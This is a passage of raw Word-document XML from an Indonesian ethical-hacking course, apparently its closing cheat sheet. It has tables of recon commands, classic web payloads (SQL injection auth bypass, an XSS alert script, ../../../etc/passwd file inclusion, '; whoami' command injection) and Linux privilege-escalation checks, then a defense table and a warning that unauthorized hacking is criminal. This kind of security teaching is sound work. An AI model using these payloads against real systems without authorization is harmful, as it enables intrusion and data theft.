              <w:t>Contoh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>nmap -sV</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Port+versi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>nmap -sV -p 22,80,443 target</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>gobuster dir</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Dir brute</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>gobuster dir -u target -w wordlist.txt</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>subfinder</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Subdomain</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>subfinder -d target.com</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>wafw00f</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Deteksi WAF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>wafw00f https://target.com</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Web Exploit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Teknik</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Payload</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Contoh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SQLi Bypass</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>' OR '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>password=' OR '1'='1' --</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>XSS</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>?q=&lt;script&gt;alert(1)&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>LFI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>../../../etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>?file=../../../etc/passwd</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Command Inj</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>; whoami</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>?ip=127.0.0.1; whoami</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Linux PrivEsc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Cek</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Command</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Makna</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SUID</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>find / -perm -4000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Binary aneh</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>sudo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>sudo -l</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Cmd bisa root</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Kernel</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>uname -a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Kernel lawas</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Defense in Depth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Lapis</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Fungsi</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
              </w:rPr>
              <w:t>Tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Firewall</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Blokir akses</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>UFW,iptables</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>WAF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Blokir serangan web</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>ModSecurity+CRS</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>SIEM</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Monitor</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3135"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Wazuh,Splunk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PENUTUP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Selamat! Kamu telah menyelesaikan 24 Sesi Ethical Elite Hacker v11.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Next Steps:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Praktek di DVWA / HTB / TryHackMe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Bug Bounty di HackerOne / Bugcrowd</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Sertifikasi: OSCP, CEH, Security+</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Buat portfolio GitHub &amp; LinkedIn</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
          <w:color w:val="C80000"/>
        </w:rPr>
        <w:t>⚠ INGAT: Hacking tanpa izin = KRIMINAL!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